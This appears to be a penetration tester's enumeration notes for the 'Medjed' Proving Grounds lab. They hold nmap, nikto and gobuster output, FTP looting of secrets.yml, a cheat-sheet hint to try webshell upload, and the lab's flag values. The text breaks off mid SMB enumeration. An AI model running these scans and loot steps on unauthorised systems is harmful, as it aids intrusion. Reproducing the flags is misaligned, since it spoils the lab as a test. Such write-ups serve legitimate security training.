**Metadata**

- IP Address:  192.168.162.127
- Hostname:  medjed
- OS: 	Microsoft Windows 10 Pro
- Found Credentials/Users:
		Jerren
		Administrator 
Main Objectives:

Local.txt = a778dbc88acccd4c2879237a7fdfba25
Proof.txt = 1e99302cf813b02b2700c0989d15d61f

**Enumeration**

1. NMAP Scans (TCP/UDP)

```

The below commands will run as part of pg_recon.sh or you can run manually. 

[+] Running: Nmap BASIC TCP (top 1000)
[+] Command: nmap -sS -Pn -n --top-ports 1000 -T4 --open 192.168.162.127 -oN - 
# Nmap 7.95 scan initiated Tue Jan  6 12:20:45 2026 as: nmap -sS -Pn -n --top-ports 1000 -T4 --open -oN - 192.168.162.127
Nmap scan report for 192.168.162.127
Host is up (0.073s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
8000/tcp open  http-alt

[+] Running: Nmap ALL TCP (all ports + versions)
[+] Command: nmap -sS -Pn -n -p- -T4 --open -sV --version-all 192.168.162.127 -oN /home/kali/ProvingGround/Medjed/nmap/full_tcp.nmap -oG /home/kali/ProvingGround/Medjed/nmap/full_tcp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-06 12:20 MST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 2.16% done; ETC: 12:22 (0:01:31 remaining)
Nmap scan report for 192.168.162.127
Host is up (0.072s latency).
Not shown: 65274 closed tcp ports (reset), 243 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8000/tcp  open  http-alt      BarracudaServer.com (Windows)
30021/tcp open  ftp           FileZilla ftpd 0.9.41 beta
33033/tcp open  unknown
44330/tcp open  ssl/unknown
45332/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
45443/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC


[+] Running: Nmap MEDIUM UDP (top 1000 + bounded)
[+] Command: nmap -sU -Pn -n --top-ports 1000 -T4 --open -sV --version-intensity 5 --max-retries 1 --host-timeout 20m 192.168.162.127 -oN /home/kali/ProvingGround/Medjed/nmap/medium_udp.nmap -oG /home/kali/ProvingGround/Medjed/nmap/medium_udp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-06 12:30 MST
Warning: 192.168.162.127 giving up on port because retransmission cap hit (1).
Nmap scan report for 192.168.162.127
Host is up (0.076s latency).
Skipping host 192.168.162.127 due to host timeout
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

nmap -sU -Pn -n -p- -T4 --open -sV --version-all --max-retries 2 --host-timeout 60m "$IP" -oN nmap/UDP_Full_Out
# Full UDP Scan. Not run automatically with automated script (must be explicitly picked)

```

2. Interesting Ports/Services

```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8000/tcp  open  http-alt      BarracudaServer.com (Windows)
30021/tcp open  ftp           FileZilla ftpd 0.9.41 beta
33033/tcp open  unknown
44330/tcp open  ssl/unknown
45332/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
45443/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
```

3. FTP Enumeration (30021)

```
FTP (21/tcp) Enumeration & Exploitation – OSCP Cheat Sheet

Metadata
Service: ftpd 
Version: FileZilla 0.9.41 beta

1. Banner & Version Enumeration

nc 192.168.162.127 30021

nmap -p 30021 -sV 192.168.162.127

30021/tcp open   ftp           FileZilla ftpd 0.9.41 beta
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla


Look for:

* FTP server type (vsftpd, ProFTPD, Pure-FTPd, FileZilla)
* Exact version numbers
* Anonymous login hints

---

3. Anonymous Login Test (ALWAYS)

ftp 192.168.162.127:30021

Credentials:

Username: anonymous
Password: anonymous

or any password

After login:

ls
pwd
cd /
cd pub
binary
passive

| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            536 Nov 03  2020 .gitignore
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 app
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 bin
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 config
| -r--r--r-- 1 ftp ftp            130 Nov 03  2020 config.ru
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 db
| -r--r--r-- 1 ftp ftp           1750 Nov 03  2020 Gemfile
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 lib
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 log
| -r--r--r-- 1 ftp ftp             66 Nov 03  2020 package.json
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 public
| -r--r--r-- 1 ftp ftp            227 Nov 03  2020 Rakefile
| -r--r--r-- 1 ftp ftp            374 Nov 03  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 test
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 tmp
|_drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 vendor

---

4. Anonymous Upload Test

Create a test file:

echo test > test

Upload:

put test
local: test remote: test
229 Entering Extended Passive Mode (|||50661|)
550 Permission denied
 
If upload succeeds:

* Check if directory maps to web root
* Attempt webshell upload
* Look for cron/script abuse

---

5. Download Everything (Loot First)

From local machine:

wget -r ftp://anonymous:anonymous@192.168.162.127:30021

From ftp client:

prompt
mget *

Interesting Finds:
database.yml
secrets.yml
```

4. Web Enumeration (8000)

```
Site Visit: Take you to http://192.168.162.127:8000/Config-Wizard/wizard/SetAdmin.lsp where it looks like you can set an admin username/password. 

192.168.162.127:8000/red.txt

Edit red.txt<br/>in directory<br/>cmsdocs

Created user admin/admin

8000/tcp  open   http-alt      BarracudaServer.com (Windows)
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|   Server Date: Tue, 06 Jan 2026 19:52:48 GMT
|   WebDAV type: Unknown
|_  Server Type: BarracudaServer.com (Windows)
|_http-server-header: BarracudaServer.com (Windows)
|_http-title: Home

[+] Running: Nikto (8000)
[+] Command: nikto -h http://192.168.162.127:8000 -output /home/kali/ProvingGround/Medjed/web/192.168.162.127_8000/nikto.txt -Format txt 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.162.127
+ Target Hostname:    192.168.162.127
+ Target Port:        8000
+ Start Time:         2026-01-06 14:07:16 (GMT-7)
---------------------------------------------------------------------------
+ Server: BarracudaServer.com (Windows)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, PROPFIND, PUT, COPY, DELETE, MOVE, MKCOL, PROPPATCH, LOCK, UNLOCK .
+ HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ OPTIONS: WebDAV enabled (UNLOCK COPY LOCK MKCOL PROPPATCH PROPFIND listed as allowed).
+ /private/: This might be interesting.
+ 8259 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2026-01-06 14:26:50 (GMT-7) (1174 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

[+] Command: curl -k -L -sS -i --connect-timeout 5 --max-time 30 http://192.168.162.127:8000 
Too long see output file

[+] Running: Gobuster BASIC (8000) (exclude-length 0)
[+] Command: gobuster dir -u http://192.168.162.127:8000 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Medjed/gobuster/Medjed_192.168.162.127_8000_dir_basic.txt --exclude-length 0 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.127:8000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          0
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/favicon.ico          (Status: 200) [Size: 600]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished

[+] Running: Gobuster ADVANCED (8000) (exclude-length 0)
[+] Command: gobuster dir -u http://192.168.162.127:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Medjed/gobuster/Medjed_192.168.162.127_8000_dir_advanced.txt --exclude-length 0 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.127:8000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          0
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished

[+] Running: Gobuster FILE search (8000) (exclude-length 0)
[+] Command: gobuster dir -u http://192.168.162.127:8000 -w /usr/share/wordlists/dirb/common.txt -x php\,asp\,aspx\,jsp\,html\,txt\,bak\,old\,zip\,tar\,tar.gz -t 50 -o /home/kali/ProvingGround/Medjed/gobuster/Medjed_192.168.162.127_8000_files.txt --exclude-length 0 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.127:8000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          0
[+] User Agent:              gobuster/3.8
[+] Extensions:              aspx,jsp,old,zip,tar.gz,php,asp,html,txt,bak,tar
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/favicon.ico          (Status: 200) [Size: 600]
/photos.html          (Status: 200) [Size: 6809]
/red.txt              (Status: 200) [Size: 42]
Progress: 55356 / 55356 (100.00%)
===============================================================
Finished

[+] Running: Gobuster LOWERCASE dir (8000) (exclude-length 0)
[+] Command: gobuster dir -u http://192.168.162.127:8000 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Medjed/gobuster/Medjed_192.168.162.127_8000_dir_lowercase.txt --exclude-length 0 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.127:8000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          0
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 207641 / 207641 (100.00%)
===============================================================
Finished


```

4. Web Enumeration (45332)

```
Site Visit: Takes you to a .js quiz app. http://192.168.162.127:45332/phpinfo.php is naviagatable.

45332/tcp open   http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Quiz App

nikto -h 192.168.101.110

[+] Running: Curl snapshot (45332)
[+] Command: curl -k -L -sS -i --connect-timeout 5 --max-time 30 http://192.168.162.127:45332 
HTTP/1.1 200 OK
Date: Tue, 06 Jan 2026 21:48:06 GMT
Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
Last-Modified: Tue, 03 Nov 2020 19:13:21 GMT
ETag: "377-5b338a7ff72a5"
Accept-Ranges: bytes
Content-Length: 887
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link href="styles.css" rel="stylesheet">
  <script defer src="script.js"></script>
  <title>Quiz App</title>
</head>
<body>
  <div class="container">
    <div id="question-container" class="hide">
      <div id="question">Question</div>
      <div id="answer-buttons" class="btn-grid">
        <button class="btn">Answer 1</button>
        <button class="btn">Answer 2</button>
        <button class="btn">Answer 3</button>
        <button class="btn">Answer 4</button>
      </div>
    </div>
    <div class="controls">
      <button id="start-btn" class="start-btn btn">Start</button>
      <button id="next-btn" class="next-btn btn hide">Next</button>
    </div>
  </div>
</body>
</html>

[+] Running: Gobuster BASIC (45332)
[+] Command: gobuster dir -u http://192.168.162.127:45332 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Medjed/gobuster/Medjed_192.168.162.127_45332_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.127:45332
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 308]
/.htaccess            (Status: 403) [Size: 308]
/.htpasswd            (Status: 403) [Size: 308]
/aux                  (Status: 403) [Size: 308]
/cgi-bin/             (Status: 403) [Size: 308]
/com2                 (Status: 403) [Size: 308]
/com1                 (Status: 403) [Size: 308]
/com3                 (Status: 403) [Size: 308]
/con                  (Status: 403) [Size: 308]
==/index.html           (Status: 200) [Size: 887]==
/licenses             (Status: 403) [Size: 427]
/lpt2                 (Status: 403) [Size: 308]
/lpt1                 (Status: 403) [Size: 308]
/nul                  (Status: 403) [Size: 308]
/examples             (Status: 503) [Size: 408]
/phpmyadmin           (Status: 403) [Size: 308]
==/phpinfo.php          (Status: 200) [Size: 90796]==
/prn                  (Status: 403) [Size: 308]
/server-status        (Status: 403) [Size: 427]
/server-info          (Status: 403) [Size: 427]
/webalizer            (Status: 403) [Size: 308]
Progress: 4381 / 4613 (94.97%)
Progress: 4613 / 4613 (100.00%)===============================================================
Finished

[+] Running: Gobuster ADVANCED (45332)
[+] Command: gobuster dir -u http://192.168.162.127:45332 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Medjed/gobuster/Medjed_192.168.162.127_45332_dir_advanced.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.127:45332
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 403) [Size: 308]
/licenses             (Status: 403) [Size: 427]
/examples             (Status: 503) [Size: 408]
/*checkout*           (Status: 403) [Size: 308]
/phpmyadmin           (Status: 403) [Size: 308]
/webalizer            (Status: 403) [Size: 308]
/*docroot*            (Status: 403) [Size: 308]
/*                    (Status: 403) [Size: 308]
/con                  (Status: 403) [Size: 308]
/**http%3a            (Status: 403) [Size: 308]
/*http%3A             (Status: 403) [Size: 308]
/aux                  (Status: 403) [Size: 308]
/**http%3A            (Status: 403) [Size: 308]
/**http%3A%2F%2Fwww   (Status: 403) [Size: 308]
/server-status        (Status: 403) [Size: 427]
/devinmoore*          (Status: 403) [Size: 308]
/200109*              (Status: 403) [Size: 308]
/*dc_                 (Status: 403) [Size: 308]
/*sa_                 (Status: 403) [Size: 308]
Progress: 220356 / 220558 (99.91%)
Progress: 220558 / 220558 (100.00%)===============================================================
Finished

[+] Running: Gobuster FILE search (45332)
[+] Command: gobuster dir -u http://192.168.162.127:45332 -w /usr/share/wordlists/dirb/common.txt -x php\,asp\,aspx\,jsp\,html\,txt\,bak\,old\,zip\,tar\,tar.gz -t 50 -o /home/kali/ProvingGround/Medjed/gobuster/Medjed_192.168.162.127_45332_files.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.127:45332
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              aspx,txt,old,jsp,html,bak,zip,tar,tar.gz,php,asp
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/examples             (Status: 503) [Size: 408]
/index.html           (Status: 200) [Size: 887]
/Index.html           (Status: 200) [Size: 887]
/index.html           (Status: 200) [Size: 887]
/phpinfo.php          (Status: 200) [Size: 90796]
/phpinfo.php          (Status: 200) [Size: 90796]

Progress: 55356 / 55356 (100.00%)
===============================================================
Progress: 55356 / 55356 (100.00%)Finished

[+] Running: Gobuster LOWERCASE dir (45332)
[+] Command: gobuster dir -u http://192.168.162.127:45332 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Medjed/gobuster/Medjed_192.168.162.127_45332_dir_lowercase.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.127:45332
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 403) [Size: 308]
/licenses             (Status: 403) [Size: 427]
/examples             (Status: 503) [Size: 408]
/*checkout*           (Status: 403) [Size: 308]
/phpmyadmin           (Status: 403) [Size: 308]
/webalizer            (Status: 403) [Size: 308]
/*docroot*            (Status: 403) [Size: 308]
/*                    (Status: 403) [Size: 308]
/con                  (Status: 403) [Size: 308]
/**http%3a            (Status: 403) [Size: 308]
/*http%3a             (Status: 403) [Size: 308]
/aux                  (Status: 403) [Size: 308]
/**http%3a%2f%2fwww   (Status: 403) [Size: 308]
/server-status        (Status: 403) [Size: 427]
/devinmoore*          (Status: 403) [Size: 308]
/200109*              (Status: 403) [Size: 308]
/*dc_                 (Status: 403) [Size: 308]
/*sa_                 (Status: 403) [Size: 308]
Progress: 207458 / 207641 (99.91%)
===============================================================
Finished


```

4. Web Enumeration (45443)

```
Site Visit: Takes you to a .js quiz app. http://192.168.162.127:45443/phpinfo.php navigatable. 

45443/tcp open   http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-title: Quiz App
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
| http-methods: 

nikto -h 192.168.101.110

[+] Command: curl -k -L -sS -i --connect-timeout 5 --max-time 30 http://192.168.162.127:45443 
HTTP/1.1 200 OK
Date: Tue, 06 Jan 2026 21:48:06 GMT
Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
Last-Modified: Tue, 03 Nov 2020 19:13:21 GMT
ETag: "377-5b338a7ff72a5"
Accept-Ranges: bytes
Content-Length: 887
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link href="styles.css" rel="stylesheet">
  <script defer src="script.js"></script>
  <title>Quiz App</title>
</head>
<body>
  <div class="container">
    <div id="question-container" class="hide">
      <div id="question">Question</div>
      <div id="answer-buttons" class="btn-grid">
        <button class="btn">Answer 1</button>
        <button class="btn">Answer 2</button>
        <button class="btn">Answer 3</button>
        <button class="btn">Answer 4</button>
      </div>
    </div>
    <div class="controls">
      <button id="start-btn" class="start-btn btn">Start</button>
      <button id="next-btn" class="next-btn btn hide">Next</button>
    </div>
  </div>
</body>
</html>


[+] Running: Gobuster BASIC (45443)
[+] Command: gobuster dir -u http://192.168.162.127:45443 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Medjed/gobuster/Medjed_192.168.162.127_45443_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.127:45443
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 308]
/.htaccess            (Status: 403) [Size: 308]
/.hta                 (Status: 403) [Size: 308]
/aux                  (Status: 403) [Size: 308]
/cgi-bin/             (Status: 403) [Size: 308]
/com2                 (Status: 403) [Size: 308]
/com1                 (Status: 403) [Size: 308]
/com3                 (Status: 403) [Size: 308]
/con                  (Status: 403) [Size: 308]
==/index.html           (Status: 200) [Size: 887]==
/licenses             (Status: 403) [Size: 427]
/lpt2                 (Status: 403) [Size: 308]
/lpt1                 (Status: 403) [Size: 308]
/examples             (Status: 503) [Size: 408]
/nul                  (Status: 403) [Size: 308]
/phpmyadmin           (Status: 403) [Size: 308]
==/phpinfo.php          (Status: 200) [Size: 90794]==
/prn                  (Status: 403) [Size: 308]
/server-status        (Status: 403) [Size: 427]
/server-info          (Status: 403) [Size: 427]
/webalizer            (Status: 403) [Size: 308]
Progress: 4612 / 4613 (99.98%)
Progress: 4613 / 4613 (100.00%)===============================================================
Finished

[+] Running: Gobuster FILE search (45443)
[+] Command: gobuster dir -u http://192.168.162.127:45443 -w /usr/share/wordlists/dirb/common.txt -x php\,asp\,aspx\,jsp\,html\,txt\,bak\,old\,zip\,tar\,tar.gz -t 50 -o /home/kali/ProvingGround/Medjed/gobuster/Medjed_192.168.162.127_45443_files.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.127:45443
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              jsp,html,txt,bak,old,tar,tar.gz,php,asp,aspx,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/examples             (Status: 503) [Size: 408]
/index.html           (Status: 200) [Size: 887]
/Index.html           (Status: 200) [Size: 887]
/index.html           (Status: 200) [Size: 887]
/phpinfo.php          (Status: 200) [Size: 90796]
/phpinfo.php          (Status: 200) [Size: 90796]
(100.00%)===============================================================
Finished

[+] Command: gobuster dir -u http://192.168.162.127:45443 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Medjed/gobuster/Medjed_192.168.162.127_45443_dir_lowercase.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.127:45443
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 403) [Size: 308]
/licenses             (Status: 403) [Size: 427]
/examples             (Status: 503) [Size: 408]
/*checkout*           (Status: 403) [Size: 308]
/phpmyadmin           (Status: 403) [Size: 308]
/webalizer            (Status: 403) [Size: 308]
/*docroot*            (Status: 403) [Size: 308]
/*                    (Status: 403) [Size: 308]
/con                  (Status: 403) [Size: 308]
/**http%3a            (Status: 403) [Size: 308]
/*http%3a             (Status: 403) [Size: 308]
/aux                  (Status: 403) [Size: 308]
/**http%3a%2f%2fwww   (Status: 403) [Size: 308]
/server-status        (Status: 403) [Size: 427]
/devinmoore*          (Status: 403) [Size: 308]
/200109*              (Status: 403) [Size: 308]
/*dc_                 (Status: 403) [Size: 308]
/*sa_                 (Status: 403) [Size: 308]
Progress: 207613 / 207641 (99.99%)
Progress: 207641 / 207641 (100.00%)===============================================================
Finished
=============

```

4. Web Enumeration (44330)

```
Site Visit: Might just be a https version of 192.168.162.127:8000.

nikto -h 192.168.162.127:44330 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.162.127
+ Target Hostname:    192.168.162.127
+ Target Port:        44330
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=US/ST=CA/L=Laguna Niguel/O=Real Time Logic/OU=SharkSSL/CN=server demo 1024 bits/emailAddress=ginfo@realtimelogic.com
                   Ciphers:  DHE-RSA-AES256-SHA256
                   Issuer:   /C=US/ST=CA/L=Laguna Niguel/O=Real Time Logic/OU=SharkSSL/CN=demo CA/emailAddress=ginfo@realtimelogic.com
+ Start Time:         2026-01-06 14:57:42 (GMT-7)
---------------------------------------------------------------------------
+ Server: BarracudaServer.com (Windows)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The site uses TLS and the Strict-Transport-Security HTTP header is not defined. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: The Content-Encoding header is set to "deflate" which may mean that the server is vulnerable to the BREACH attack. See: http://breachattack.com/
+ Hostname '192.168.162.127' does not match certificate's names: server. See: https://cwe.mitre.org/data/definitions/297.html
+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, PROPFIND, PUT, COPY, DELETE, MOVE, MKCOL, PROPPATCH, LOCK, UNLOCK .
+ HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ OPTIONS: WebDAV enabled (UNLOCK LOCK MKCOL PROPFIND COPY PROPPATCH listed as allowed).
+ /rtl/protected/admin/help/config.php: Default account found for '' at (ID '', PW '12345'). US Robotics modem. See: CWE-16
+ /rtl/protected/admin/help/config.php: PHP Config file may contain database IDs and passwords.
+ /rtl/protected/admin/appmgr/config.php: Uncommon header 'banned' found, with contents: BANNED.
+ /rtl/protected/admin/appmgr/config.php: PHP Config file may contain database IDs and passwords.
+ /private/: This might be interesting.
+ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect: Connect failed: ; Connection refused at /var/lib/nikto/plugins/LW2.pm line 5254.
: Connection refused
+ Scan terminated: 20 error(s) and 15 item(s) reported on remote host
+ End Time:           2026-01-06 15:20:40 (GMT-7) (1378 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

5. MySQL Port 3306 Enumeration  

```
mysql -h 192.168.162.127 -u root -p                     
Enter password: 
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.151' is not allowed to connect to this MariaDB server
     
```

6. RPC Port 135 Enumeration 

```
rpcinfo -p 192.168.162.127
192.168.162.127: RPC: Remote system error - Connection refused

rpcclient -U '' -N 192.168.162.127

Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

```

7. SMB Port 139, 445 Enumeration

```
smbclient -L //192.168.162.127 -U anonymous
Password for [WORKGROUP\anonymous]:
session setup failed: NT_STATUS_LOGON_FAILURE

smbmap -H 192.168.162.127             

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
